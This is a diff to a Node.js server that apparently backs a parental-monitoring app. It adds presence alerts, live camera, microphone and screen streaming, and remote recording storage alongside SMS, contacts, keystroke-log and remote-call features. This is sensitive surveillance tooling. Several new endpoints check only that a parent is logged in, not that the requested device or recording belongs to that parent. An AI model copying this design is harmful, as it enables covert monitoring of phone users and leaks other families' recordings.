@@ -14,6 +14,117 @@ process.on('uncaughtException', (e) => { console.error('uncaught', e); });
 process.on('unhandledRejection', (e) => { console.error('unhandled', e); });
 
 const PORT = process.env.PORT || 8080;
+
+// ===== Presence (AirDroid-style online/offline in ~1s) =====
+// Heartbeats update RAM instantly; disk save is debounced so Railway does not hang.
+const presenceRam = new Map(); // deviceId -> { lastMs, online, name, parentId, token }
+const presenceWaiters = []; // { parentId, res, timer, done }
+let presenceDirty = false;
+let presenceSaveTimer = null;
+const ONLINE_MS = 8000; // ~8s miss → OFFLINE (stable on slow 4G); explicit /device/offline is instant
+
+function presenceKey(d) { return String(d.deviceId || d.id || ''); }
+
+function notifyPresenceWaiters(parentId) {
+  try {
+    const keep = [];
+    for (const w of presenceWaiters) {
+      if (w.done || w.res.writableEnded) continue;
+      if (parentId && w.parentId && w.parentId !== parentId) { keep.push(w); continue; }
+      w.done = true;
+      try { clearTimeout(w.timer); } catch (e) {}
+      try {
+        send(w.res, 200, { ok: true, changed: true, ts: Date.now() });
+      } catch (e) {}
+    }
+    presenceWaiters.length = 0;
+    for (const w of keep) presenceWaiters.push(w);
+  } catch (e) { console.error("notifyPresenceWaiters", e); }
+}
+
+function pushPresenceAlert(db, d, online, reason) {
+  try {
+    if (!db.alerts) db.alerts = [];
+    const name = d.name || d.childName || "Child";
+    db.alerts.push({
+      id: Date.now() + Math.floor(Math.random() * 999),
+      parentId: d.parentId,
+      deviceId: d.deviceId,
+      title: online ? (name + " is ONLINE") : (name + " is OFFLINE"),
+      message: online
+        ? (name + " phone connected" + (reason ? (" · " + reason) : ""))
+        : (name + " phone disconnected" + (reason ? (" · " + reason) : " · restart / network / app killed")),
+      type: "PRESENCE",
+      subtype: online ? "CHILD_ONLINE" : "CHILD_OFFLINE",
+      read: false,
+      createdAt: now()
+    });
+    if (db.alerts.length > 400) db.alerts = db.alerts.slice(-250);
+    presenceDirty = true;
+  } catch (e) {}
+}
+
+function markPresence(d, online, reason) {
+  if (!d || !d.deviceId) return;
+  const prev = presenceRam.get(d.deviceId);
+  const was = prev ? !!prev.online : (d.online ? true : false);
+  const nowMs = Date.now();
+  presenceRam.set(d.deviceId, {
+    lastMs: online ? nowMs : (prev && prev.lastMs ? prev.lastMs : nowMs),
+    online: !!online,
+    name: d.name,
+    parentId: d.parentId,
+    token: d.childToken
+  });
+  if (!!was !== !!online) {
+    const db = load();
+    pushPresenceAlert(db, d, !!online, reason || "");
+    d.online = online ? 1 : 0;
+    if (online) d.lastSeen = now();
+    schedulePresenceSave();
+    notifyPresenceWaiters(d.parentId);
+    console.log("presence", d.name || d.deviceId, online ? "ONLINE" : "OFFLINE", reason || "");
+  }
+}
+
+function schedulePresenceSave() {
+  presenceDirty = true;
+  if (presenceSaveTimer) return;
+  presenceSaveTimer = setTimeout(() => {
+    presenceSaveTimer = null;
+    if (!presenceDirty) return;
+    presenceDirty = false;
+    try { save(load()); } catch (e) { console.error("presence save", e); }
+  }, 4000);
+}
+
+function sweepPresence() {
+  try {
+    const db = load();
+    const nowMs = Date.now();
+    let changed = false;
+    for (const d of (db.devices || [])) {
+      if (!d || !d.deviceId) continue;
+      const pr = presenceRam.get(d.deviceId);
+      let lastMs = pr ? pr.lastMs : 0;
+      if (!lastMs && d.lastSeen) {
+        lastMs = Date.parse(String(d.lastSeen)) || 0;
+      }
+      const isOn = lastMs > 0 && (nowMs - lastMs) < ONLINE_MS;
+      const was = pr ? !!pr.online : !!d.online;
+      if (!pr) {
+        presenceRam.set(d.deviceId, { lastMs: lastMs || 0, online: isOn, name: d.name, parentId: d.parentId, token: d.childToken });
+      }
+      if (was && !isOn) {
+        markPresence(d, false, "heartbeat timeout");
+        changed = true;
+      }
+    }
+    if (changed) schedulePresenceSave();
+  } catch (e) {}
+}
+setInterval(sweepPresence, 2000);
+
 const DATA = path.join(__dirname, 'data');
 const MEDIA = path.join(__dirname, 'media');
 [DATA, MEDIA].forEach(d => { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); });
@@ -23,6 +134,111 @@ const DB_FILE = path.join(DATA, 'db.json');
 // Avoids disk read on every parent poll → much lower latency, closer to AirDroid Kids live voice.
 // key = deviceId + '|' + kindUpper  →  { id, kind, b64, createdAt, createdMs }
 const liveLatest = new Map();
+// Long-poll waiters for continuous live (parent holds until new frame) — closer to WebRTC feel
+// key = deviceId + '|' + KIND  →  [{ res, sinceMs, timer, wantRaw, isAudio }]
+const liveWaiters = new Map();
+// Persistent MJPEG / PCM continuous writers (one long HTTP connection)
+const liveMjpeg = new Map(); // key -> [{ res, isAudio, alive }]
+
+function mjpegKeys(deviceId, kindU) {
+  const ku = String(kindU || '').toUpperCase();
+  const keys = [deviceId + '|' + ku];
+  if (ku.indexOf('AUDIO') >= 0) keys.push(deviceId + '|LIVE_AUDIO', deviceId + '|AUDIO');
+  else if (ku.indexOf('SCREEN') >= 0) keys.push(deviceId + '|LIVE_SCREEN', deviceId + '|SCREEN');
+  else keys.push(deviceId + '|LIVE_CAMERA', deviceId + '|CAMERA', deviceId + '|LIVE_CAMERA_FRONT', deviceId + '|LIVE_CAMERA_BACK');
+  return keys;
+}
+
+function pushContinuous(deviceId, kindU, entry) {
+  try {
+    if (!entry || !entry.b64) return;
+    const buf = Buffer.from(String(entry.b64), 'base64');
+    const ms = entry.createdMs || Date.now();
+    const isAudio = String(kindU || '').toUpperCase().indexOf('AUDIO') >= 0;
+    for (const k of mjpegKeys(deviceId, kindU)) {
+      const list = liveMjpeg.get(k);
+      if (!list || !list.length) continue;
+      const keep = [];
+      for (const w of list) {
+        if (!w.alive || w.res.writableEnded) continue;
+        try {
+          if (isAudio || w.isAudio) {
+            // raw PCM chunk with length header line for parent parser: PCM\nlen\n + bytes
+            w.res.write('PCM\n' + buf.length + '\n' + ms + '\n');
+            w.res.write(buf);
+          } else {
+            w.res.write('--frame\r\n');
+            w.res.write('Content-Type: image/jpeg\r\n');
+            w.res.write('Content-Length: ' + buf.length + '\r\n');
+            w.res.write('X-Timestamp: ' + ms + '\r\n\r\n');
+            w.res.write(buf);
+            w.res.write('\r\n');
+          }
+          keep.push(w);
+        } catch (e) {
+          try { w.alive = false; } catch (e2) {}
+        }
+      }
+      if (keep.length) liveMjpeg.set(k, keep);
+      else liveMjpeg.delete(k);
+    }
+  } catch (e) {
+    console.error('pushContinuous', e);
+  }
+}
+
+
+function notifyLiveWaiters(deviceId, kindU, entry) {
+  try {
+    if (!entry || !entry.b64) return;
+    const keys = [];
+    const ku = String(kindU || '').toUpperCase();
+    keys.push(deviceId + '|' + ku);
+    if (ku.indexOf('AUDIO') >= 0) {
+      keys.push(deviceId + '|LIVE_AUDIO', deviceId + '|AUDIO', deviceId + '|audio');
+    } else if (ku.indexOf('SCREEN') >= 0) {
+      keys.push(deviceId + '|LIVE_SCREEN', deviceId + '|SCREEN', deviceId + '|screen');
+    } else {
+      keys.push(deviceId + '|LIVE_CAMERA', deviceId + '|CAMERA', deviceId + '|camera',
+        deviceId + '|LIVE_CAMERA_FRONT', deviceId + '|LIVE_CAMERA_BACK');
+    }
+    const seen = new Set();
+    for (const k of keys) {
+      const list = liveWaiters.get(k);
+      if (!list || !list.length) continue;
+      const left = [];
+      for (const w of list) {
+        try {
+          if (w.done) continue;
+          const ms = entry.createdMs || Date.now();
+          if (w.sinceMs && ms <= w.sinceMs) { left.push(w); continue; }
+          w.done = true;
+          try { clearTimeout(w.timer); } catch (e) {}
+          const buf = Buffer.from(String(entry.b64), 'base64');
+          if (w.wantRaw) {
+            w.res.writeHead(200, {
+              'Content-Type': w.isAudio ? 'audio/pcm' : 'image/jpeg',
+              'Content-Length': buf.length,
+              'X-Timestamp': String(ms),
+              'Cache-Control': 'no-store',
+              'Access-Control-Allow-Origin': '*'
+            });
+            w.res.end(buf);
+          } else {
+            send(w.res, 200, { media: { kind: entry.kind, body: entry.b64, createdMs: ms } });
+          }
+          seen.add(w);
+        } catch (e) {
+          try { w.done = true; } catch (e2) {}
+        }
+      }
+      if (left.length) liveWaiters.set(k, left);
+      else liveWaiters.delete(k);
+    }
+  } catch (e) {
+    console.error('notifyLiveWaiters', e);
+  }
+}
 
 // Single in-memory DB — prevents async request races that dropped parents/devices
 let MEM_DB = null;
@@ -133,7 +349,7 @@ const server = http.createServer(async (req, res) => {
     let pathname = u.pathname.replace(/\/+$/, '') || '/';
     // Health FIRST - never block on body/db
     if (pathname === '/health' || pathname === '/') {
-      return send(res, 200, { ok: true, phase: 77, store: 'json-file', web: true, snapshots: true, recordings: true, sms: true, map: true, live: true, liveFix: true, gallery: true, files: true, music: true });
+      return send(res, 200, { ok: true, phase: 89, store: 'json-file', web: true, snapshots: true, recordings: true, sms: true, map: true, live: true, liveFix: true, gallery: true, files: true, music: true });
     }
     const q = Object.fromEntries(u.searchParams.entries());
     let body = {};
@@ -141,8 +357,10 @@ const server = http.createServer(async (req, res) => {
     if (req.method === 'POST') {
       const ct = String((req.headers && (req.headers['content-type'] || req.headers['Content-Type'])) || '').toLowerCase();
       // Binary live frames (image/jpeg, audio/pcm, octet-stream)
-      if (ct.indexOf('image/') >= 0 || ct.indexOf('audio/') >= 0 || ct.indexOf('octet-stream') >= 0
-          || pathname === '/media/upload') {
+      if (ct.indexOf('image/') >= 0 || ct.indexOf('audio/') >= 0 || ct.indexOf('video/') >= 0
+          || ct.indexOf('octet-stream') >= 0
+          || pathname === '/media/upload'
+          || pathname === '/recordings/upload') {
         rawBuf = await new Promise((resolve) => {
           const chunks = [];
           let size = 0;
@@ -296,14 +514,13 @@ const server = http.createServer(async (req, res) => {
         if (p.linkedParentId && x.id === p.linkedParentId) parentIds.add(x.id);
         if (p.familyCode && x.familyCode === p.familyCode) parentIds.add(x.id);
       });
-      // Online if heartbeat within 5 minutes (SIM switch / Doze grace)
-      const ONLINE_MS = 5 * 60 * 1000;
       const nowMs = Date.now();
       let dirty = false;
       const list = db.devices.filter(d => parentIds.has(d.parentId)).map(d => {
-        let lastMs = 0;
+        const pr = presenceRam.get(d.deviceId);
+        let lastMs = pr ? pr.lastMs : 0;
         try {
-          if (d.lastSeen) lastMs = Date.parse(String(d.lastSeen));
+          if (!lastMs && d.lastSeen) lastMs = Date.parse(String(d.lastSeen));
         } catch (e) { lastMs = 0; }
         if (!lastMs || isNaN(lastMs)) lastMs = 0;
         const isOnline = lastMs > 0 && (nowMs - lastMs) < ONLINE_MS;
@@ -327,9 +544,50 @@ const server = http.createServer(async (req, res) => {
         };
       });
       if (dirty) { try { save(db); } catch (e) {} }
-      return send(res, 200, { devices: list, phase: 77 });
+      return send(res, 200, { devices: list, phase: 89 });
     }
-    if (pathname === '/device/remove' && req.method === 'POST') {
+
+    if ((pathname === '/presence' || pathname === '/presence/status') && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      sweepPresence();
+      const db = load();
+      const parentIds = new Set([p.id]);
+      db.parents.forEach(x => {
+        if (x.linkedParentId === p.id) parentIds.add(x.id);
+        if (p.familyCode && x.familyCode === p.familyCode) parentIds.add(x.id);
+      });
+      const nowMs = Date.now();
+      const devices = db.devices.filter(d => parentIds.has(d.parentId)).map(d => {
+        const pr = presenceRam.get(d.deviceId);
+        const lastMs = (pr && pr.lastMs) || (d.lastSeen ? Date.parse(String(d.lastSeen)) : 0) || 0;
+        const isOnline = lastMs > 0 && (nowMs - lastMs) < ONLINE_MS;
+        return {
+          deviceId: d.deviceId, name: d.name, online: isOnline ? 1 : 0,
+          lastSeenAgeSec: lastMs ? Math.round((nowMs - lastMs) / 1000) : null,
+          battery: d.battery, charging: d.charging ? 1 : 0, netType: d.netType || ''
+        };
+      });
+      return send(res, 200, { ok: true, devices, ts: nowMs, onlineMs: ONLINE_MS, phase: 89 });
+    }
+    if (pathname === '/presence/wait' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      const waiter = { parentId: p.id, res, done: false, timer: null };
+      waiter.timer = setTimeout(() => {
+        if (waiter.done) return;
+        waiter.done = true;
+        try { send(res, 200, { ok: true, changed: false, ts: Date.now() }); } catch (e) {}
+      }, 12000);
+      presenceWaiters.push(waiter);
+      req.on('close', () => {
+        waiter.done = true;
+        try { clearTimeout(waiter.timer); } catch (e) {}
+      });
+      return;
+    }
+
+        if (pathname === '/device/remove' && req.method === 'POST') {
       const p = parentOf(body, q, req.headers);
       if (!p) return send(res, 401, { error: 'unauthorized' });
       const db = load();
@@ -346,6 +604,7 @@ const server = http.createServer(async (req, res) => {
       let x = db.devices.find(a => a.childToken && d.childToken && a.childToken === d.childToken);
       if (!x) x = db.devices.find(a => a.deviceId === d.deviceId);
       if (x) {
+        const wasOff = !x.online;
         x.online = 1;
         let bat = body.battery != null ? body.battery : body.batteryLevel;
         if (bat != null && bat !== '') {
@@ -358,9 +617,25 @@ const server = http.createServer(async (req, res) => {
         if (body.netType) x.netType = String(body.netType);
         if (Array.isArray(body.sims)) x.sims = body.sims;
         x.lastSeen = now();
-        save(db);
+        markPresence(x, true, body.netType || "heartbeat");
+        // Debounced disk write — 1s heartbeats must NOT rewrite db.json every time
+        schedulePresenceSave();
+        if (wasOff) { try { save(db); } catch (e) {} }
       }
-      return send(res, 200, { ok: true, battery: x && x.battery, charging: x && x.charging, phase: 77 });
+      return send(res, 200, { ok: true, battery: x && x.battery, charging: x && x.charging, online: 1, phase: 89 });
+    }
+    if ((pathname === '/device/offline' || pathname === '/child/offline') && req.method === 'POST') {
+      const d = childOf(body, q, req.headers);
+      if (!d) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      let x = db.devices.find(a => a.childToken && d.childToken && a.childToken === d.childToken);
+      if (!x) x = db.devices.find(a => a.deviceId === d.deviceId);
+      if (x) {
+        markPresence(x, false, body.reason || 'device power off / restart');
+        x.online = 0;
+        try { save(db); } catch (e) {}
+      }
+      return send(res, 200, { ok: true, online: 0, phase: 89 });
     }
 
     if (pathname === '/location/update' && req.method === 'POST') {
@@ -695,6 +970,9 @@ const server = http.createServer(async (req, res) => {
         }
       },
       '/sms/sync': (db, d, b) => {
+        if (b.replaceAll === true || b.replaceAll === 1) {
+          db.sms = (db.sms || []).filter(x => x.deviceId !== d.deviceId);
+        }
         const items = b.items || b.messages || b.sms || (Array.isArray(b) ? b : []);
         const normDir = (v) => {
           const s = String(v || '').toUpperCase();
@@ -751,15 +1029,20 @@ const server = http.createServer(async (req, res) => {
         }
       },
       '/contacts/sync': (db, d, b) => {
-        if (b.replaceAll !== false && b.replaceAll !== 0) {
-          db.contacts = db.contacts.filter(c => c.deviceId !== d.deviceId);
+        if (b.replaceAll === true || b.replaceAll === 1 || (b.replaceAll !== false && b.replaceAll !== 0 && !b.append)) {
+          if (b.replaceAll !== false) db.contacts = db.contacts.filter(c => c.deviceId !== d.deviceId);
         }
         (b.items || b.contacts || []).forEach(c => {
           let number = c.number || '';
           if (!number && Array.isArray(c.phones) && c.phones[0]) {
             number = typeof c.phones[0] === 'object' ? (c.phones[0].number || '') : String(c.phones[0]);
           }
-          db.contacts.push({ id: rid(), deviceId: d.deviceId, name: c.name || '', number: String(number || '') });
+          const contactId = String(c.contactId || c.id || '');
+          db.contacts.push({
+            id: rid(), deviceId: d.deviceId,
+            contactId, name: c.name || '', number: String(number || ''),
+            phones: Array.isArray(c.phones) ? c.phones : (number ? [{ number: String(number) }] : [])
+          });
         });
       },
       '/keystrokes/log': (db, d, b) => {
@@ -965,11 +1248,15 @@ const server = http.createServer(async (req, res) => {
       if (!deviceId || !number) return send(res, 400, { error: 'number required' });
       const db = load();
       const simSlot = body.simSlot != null ? body.simSlot : null;
-      db.commands.push({
-        id: rid(), deviceId, command: 'place_call',
-        payload: { number, to: number, simSlot, subscriptionId: body.subscriptionId || body.subId },
-        status: 'PENDING', createdAt: now()
-      });
+      const recent = (db.commands || []).some(c => c && c.deviceId === deviceId && c.command === 'place_call'
+        && c.status === 'PENDING' && String((c.payload || {}).number || '') === number);
+      if (!recent) {
+        db.commands.push({
+          id: rid(), deviceId, command: 'place_call',
+          payload: { number, to: number, simSlot, subscriptionId: body.subscriptionId || body.subId },
+          status: 'PENDING', createdAt: now()
+        });
+      }
       db.calls.push({
         id: rid(), deviceId, number, direction: 'OUTGOING', name: '',
         duration: 0, durationSeconds: 0, createdAt: now(), startedAt: Date.now(), pending: true
@@ -1073,7 +1360,17 @@ const server = http.createServer(async (req, res) => {
     if (pathname === '/commands/send' && req.method === 'POST') {
       const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
       const db = load();
-      db.commands.push({ id: rid(), deviceId: body.deviceId, command: body.command || '', payload: body.payload || {}, status: 'PENDING', createdAt: now() });
+      const cmd = body.command || '';
+      const payload = body.payload || {};
+      if (cmd === 'place_call' || cmd === 'call_place' || cmd === 'make_call') {
+        const num = String((payload && (payload.number || payload.to)) || '');
+        const dup = (db.commands || []).some(c => c && c.deviceId === body.deviceId
+          && (c.command === 'place_call' || c.command === 'call_place' || c.command === 'make_call')
+          && (c.status === 'PENDING' || c.status === 'CLAIMED')
+          && String((c.payload || {}).number || (c.payload || {}).to || '') === num);
+        if (dup) return send(res, 200, { ok: true, deduped: true });
+      }
+      db.commands.push({ id: rid(), deviceId: body.deviceId, command: cmd, payload: payload, status: 'PENDING', createdAt: now() });
       save(db); return send(res, 200, { ok: true });
     }
     if (pathname === '/commands/pending' && req.method === 'GET') {
@@ -1230,7 +1527,7 @@ const server = http.createServer(async (req, res) => {
         return true;
       });
       toDel.forEach(k => liveLatest.delete(k));
-      return send(res, 200, { ok: true, cleared: toDel.length, phase: 77 });
+      return send(res, 200, { ok: true, cleared: toDel.length, phase: 89 });
     }
 
     if (pathname === '/media/upload' && req.method === 'POST') {
@@ -1243,6 +1540,7 @@ const server = http.createServer(async (req, res) => {
       if (kind === 'AUDIO') kind = 'AUDIO';
       // Map short types
       if (kind === 'PHOTO' || kind === 'IMAGE' || kind === 'JPG' || kind === 'JPEG') kind = 'CAMERA';
+      if (q.kind) kind = String(q.kind).toUpperCase();
 
       let b64 = body.data || body.base64 || '';
       if ((!b64 || String(b64).length === 0) && rawBuf && rawBuf.length > 0) {
@@ -1250,8 +1548,10 @@ const server = http.createServer(async (req, res) => {
         b64 = rawBuf.toString('base64');
       }
       const kindU = String(kind).toUpperCase();
-      const scheduled = !!(body.scheduled || body.source === 'SCHEDULED' || kindU.indexOf('SNAPSHOT_') === 0);
-      const manualSnap = String(body.source || '').toUpperCase() === 'MANUAL' || kindU.indexOf('SNAPSHOT') >= 0;
+      const srcQ = String(q.source || body.source || '').toUpperCase();
+      const scheduled = !!(body.scheduled || srcQ === 'SCHEDULED');
+      const manualSnap = srcQ === 'MANUAL' || String(q.snapshot || '') === '1' || String(q.oneshot || '') === '1'
+        || kindU.indexOf('SNAPSHOT') === 0;
       const isAudio = kindU.indexOf('AUDIO') >= 0 && !manualSnap && !scheduled;
       const isLive = !scheduled && !manualSnap && (
         kindU.indexOf('LIVE_') === 0
@@ -1267,6 +1567,7 @@ const server = http.createServer(async (req, res) => {
         if (isLive || isAudio || kindU.indexOf('CAMERA') >= 0 || kindU.indexOf('SCREEN') >= 0 || kindU.indexOf('AUDIO') >= 0) {
           const entry = { id, kind: kindU, b64: String(b64), createdAt, createdMs };
           liveLatest.set(d.deviceId + '|' + kindU, entry);
+          // Aliases FIRST so continuous / waiters always find the frame
           if (kindU.indexOf('AUDIO') >= 0) {
             liveLatest.set(d.deviceId + '|LIVE_AUDIO', entry);
             liveLatest.set(d.deviceId + '|AUDIO', entry);
@@ -1283,6 +1584,8 @@ const server = http.createServer(async (req, res) => {
             liveLatest.set(d.deviceId + '|LIVE_SCREEN', entry);
             liveLatest.set(d.deviceId + '|SCREEN', entry);
           }
+          try { notifyLiveWaiters(d.deviceId, kindU, entry); } catch (e) {}
+          try { pushContinuous(d.deviceId, kindU, entry); } catch (e) {}
         }
         // ONLY snapshots/manual to disk — NEVER live frames (disk write froze Railway + stuck first frame)
         try {
@@ -1313,6 +1616,136 @@ const server = http.createServer(async (req, res) => {
       }
       save(db);
       return send(res, 200, { ok: true, id, kind: kindU });
+    }
+
+
+
+    // Persistent continuous stream (MJPEG / PCM) — one connection, frames pushed like live video
+    if (pathname === '/media/continuous' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      let kind = String(q.kind || q.type || 'CAMERA').toUpperCase();
+      const deviceId = q.deviceId || q.childId || '';
+      if (!deviceId) return send(res, 400, { error: 'deviceId required' });
+      const core = kind.replace(/^LIVE_/, '');
+      const isAudio = core.indexOf('AUDIO') >= 0;
+      let waitKey = deviceId + '|LIVE_CAMERA';
+      if (isAudio) waitKey = deviceId + '|LIVE_AUDIO';
+      else if (core.indexOf('SCREEN') >= 0) waitKey = deviceId + '|LIVE_SCREEN';
+
+      if (isAudio) {
+        res.writeHead(200, {
+          'Content-Type': 'application/octet-stream',
+          'Cache-Control': 'no-store, no-cache',
+          'Connection': 'keep-alive',
+          'Access-Control-Allow-Origin': '*'
+        });
+      } else {
+        res.writeHead(200, {
+          'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
+          'Cache-Control': 'no-store, no-cache',
+          'Connection': 'keep-alive',
+          'Access-Control-Allow-Origin': '*'
+        });
+      }
+      // flush headers
+      try { if (typeof res.flushHeaders === 'function') res.flushHeaders(); } catch (e) {}
+
+      const writer = { res, isAudio, alive: true };
+      if (!liveMjpeg.has(waitKey)) liveMjpeg.set(waitKey, []);
+      liveMjpeg.get(waitKey).push(writer);
+
+      // Immediately send latest frame if any
+      try {
+        const mem = liveLatest.get(waitKey) || liveLatest.get(deviceId + '|' + (isAudio ? 'AUDIO' : (core.indexOf('SCREEN')>=0?'SCREEN':'CAMERA')));
+        if (mem && mem.b64) {
+          const buf = Buffer.from(String(mem.b64), 'base64');
+          const ms = mem.createdMs || Date.now();
+          if (isAudio) {
+            res.write('PCM\n' + buf.length + '\n' + ms + '\n');
+            res.write(buf);
+          } else {
+            res.write('--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ' + buf.length + '\r\nX-Timestamp: ' + ms + '\r\n\r\n');
+            res.write(buf);
+            res.write('\r\n');
+          }
+        }
+      } catch (e) {}
+
+      const keepAlive = setInterval(() => {
+        if (!writer.alive || res.writableEnded) { try { clearInterval(keepAlive); } catch (e) {} return; }
+        try { res.write(isAudio ? '' : ''); } catch (e) { writer.alive = false; }
+      }, 10000);
+
+      req.on('close', () => {
+        writer.alive = false;
+        try { clearInterval(keepAlive); } catch (e) {}
+        const list = liveMjpeg.get(waitKey) || [];
+        liveMjpeg.set(waitKey, list.filter(w => w !== writer));
+      });
+      return;
+    }
+
+    // Continuous live long-poll: holds until a NEWER frame than since= arrives (or timeout)
+    if (pathname === '/media/stream' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      let kind = String(q.kind || q.type || 'CAMERA').toUpperCase();
+      if (kind === 'PHOTO' || kind === 'IMAGE') kind = 'CAMERA';
+      const deviceId = q.deviceId || q.childId || '';
+      if (!deviceId) return send(res, 400, { error: 'deviceId required' });
+      const wantRaw = String(q.format || '').toLowerCase() === 'raw' || String(q.raw || '') === '1';
+      const sinceMs = Number(q.since || q.sinceMs || 0) || 0;
+      const core = kind.replace(/^LIVE_/, '').replace(/^SNAPSHOT_/, '');
+      const isAudio = core.indexOf('AUDIO') >= 0;
+      let waitKey;
+      if (isAudio) waitKey = deviceId + '|LIVE_AUDIO';
+      else if (core.indexOf('SCREEN') >= 0) waitKey = deviceId + '|LIVE_SCREEN';
+      else waitKey = deviceId + '|LIVE_CAMERA';
+
+      // If we already have a newer frame, return immediately
+      const tryKeys = isAudio
+        ? [deviceId + '|LIVE_AUDIO', deviceId + '|AUDIO', deviceId + '|' + kind]
+        : (core.indexOf('SCREEN') >= 0
+          ? [deviceId + '|LIVE_SCREEN', deviceId + '|SCREEN', deviceId + '|' + kind]
+          : [deviceId + '|LIVE_CAMERA', deviceId + '|CAMERA', deviceId + '|LIVE_CAMERA_FRONT',
+             deviceId + '|LIVE_CAMERA_BACK', deviceId + '|' + kind]);
+      for (const k of tryKeys) {
+        const mem = liveLatest.get(k);
+        if (mem && mem.b64 && (mem.createdMs || 0) > sinceMs && (Date.now() - (mem.createdMs || 0) < 15000)) {
+          const buf = Buffer.from(String(mem.b64), 'base64');
+          res.writeHead(200, {
+            'Content-Type': isAudio ? 'audio/pcm' : 'image/jpeg',
+            'Content-Length': buf.length,
+            'X-Timestamp': String(mem.createdMs || Date.now()),
+            'Cache-Control': 'no-store',
+            'Access-Control-Allow-Origin': '*'
+          });
+          res.end(buf);
+          return;
+        }
+      }
+
+      // Wait up to 12s for next frame from child
+      const waiter = { res, sinceMs, wantRaw: true, isAudio, done: false };
+      waiter.timer = setTimeout(() => {
+        if (waiter.done) return;
+        waiter.done = true;
+        try {
+          res.writeHead(204, { 'Cache-Control': 'no-store', 'Access-Control-Allow-Origin': '*' });
+          res.end();
+        } catch (e) {}
+        const list = liveWaiters.get(waitKey) || [];
+        liveWaiters.set(waitKey, list.filter(w => w !== waiter));
+      }, 12000);
+      if (!liveWaiters.has(waitKey)) liveWaiters.set(waitKey, []);
+      liveWaiters.get(waitKey).push(waiter);
+      req.on('close', () => {
+        if (waiter.done) return;
+        waiter.done = true;
+        try { clearTimeout(waiter.timer); } catch (e) {}
+        const list = liveWaiters.get(waitKey) || [];
+        liveWaiters.set(waitKey, list.filter(w => w !== waiter));
+      });
+      return;
     }
 
     if (pathname === '/media/latest' && req.method === 'GET') {
@@ -1734,6 +2167,87 @@ const server = http.createServer(async (req, res) => {
       return;
     }
 
+
+
+    // ---- Remote recordings (camera / audio / screen) ----
+    if (pathname === '/recordings/upload' && req.method === 'POST') {
+      const d = childOf(body, q, req.headers); if (!d) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      if (!db.remoteRecordings) db.remoteRecordings = [];
+      let kind = String(q.kind || q.type || body.kind || body.type || 'CAMERA').toUpperCase();
+      if (kind === 'CAMERA') kind = 'CAMERA_BACK';
+      const dur = Number(q.durationSec || body.durationSec || 0) || 0;
+      let buf = null;
+      if (rawBuf && rawBuf.length > 50) buf = rawBuf;
+      else {
+        const b64 = String(body.data || body.base64 || '');
+        if (b64.length > 50) {
+          try { buf = Buffer.from(b64.replace(/^data:[^;]+;base64,/, ''), 'base64'); } catch (e) {}
+        }
+      }
+      if (!buf || buf.length < 50) return send(res, 400, { error: 'empty recording' });
+      if (!fs.existsSync(MEDIA)) fs.mkdirSync(MEDIA, { recursive: true });
+      const id = rid();
+      const ext = kind.indexOf('AUDIO') >= 0 ? '.m4a' : '.mp4';
+      const filePath = path.join(MEDIA, d.deviceId + '_rec_' + kind + '_' + Date.now() + ext);
+      fs.writeFileSync(filePath, buf);
+      const mime = kind.indexOf('AUDIO') >= 0 ? 'audio/mp4' : 'video/mp4';
+      db.remoteRecordings.push({
+        id, deviceId: d.deviceId, kind, durationSec: dur,
+        path: filePath, size: buf.length, mime, createdAt: now()
+      });
+      // keep last 60 per device
+      const mine = db.remoteRecordings.filter(x => x.deviceId === d.deviceId);
+      if (mine.length > 60) {
+        const drop = mine.slice(0, mine.length - 60);
+        drop.forEach(x => { try { if (x.path && fs.existsSync(x.path)) fs.unlinkSync(x.path); } catch (e) {} });
+        const dropIds = new Set(drop.map(x => x.id));
+        db.remoteRecordings = db.remoteRecordings.filter(x => x.deviceId !== d.deviceId || !dropIds.has(x.id));
+      }
+      save(db);
+      return send(res, 200, { ok: true, id, size: buf.length, kind });
+    }
+    if (pathname === '/recordings' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      let list = (db.remoteRecordings || []).filter(x => x.deviceId === q.deviceId);
+      if (q.kind) {
+        const k = String(q.kind).toUpperCase();
+        list = list.filter(x => String(x.kind || '').toUpperCase().indexOf(k) >= 0);
+      }
+      list = list.slice(-200).reverse();
+      return send(res, 200, {
+        recordings: list.map(x => ({
+          id: x.id, kind: x.kind, durationSec: x.durationSec || 0,
+          size: x.size || 0, mime: x.mime || 'video/mp4',
+          createdAt: x.createdAt, hasFile: !!(x.path)
+        }))
+      });
+    }
+    if ((pathname === '/recordings/item' || pathname === '/recording') && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      const row = (db.remoteRecordings || []).find(x => String(x.id) === String(q.id));
+      if (!row || !row.path || !fs.existsSync(row.path)) return send(res, 404, { error: 'not found' });
+      const buf = fs.readFileSync(row.path);
+      if (String(q.format || '') === 'raw') {
+        res.writeHead(200, {
+          'Content-Type': row.mime || 'video/mp4',
+          'Content-Length': buf.length,
+          'Access-Control-Allow-Origin': '*'
+        });
+        res.end(buf);
+        return;
+      }
+      return send(res, 200, {
+        recording: {
+          id: row.id, kind: row.kind, durationSec: row.durationSec || 0,
+          mime: row.mime || 'video/mp4', size: row.size || buf.length,
+          body: buf.toString('base64'), base64: buf.toString('base64'),
+          createdAt: row.createdAt
+        }
+      });
+    }
 
     // ---- Call recordings ----
     if (pathname === '/calls/recording' && req.method === 'POST') {
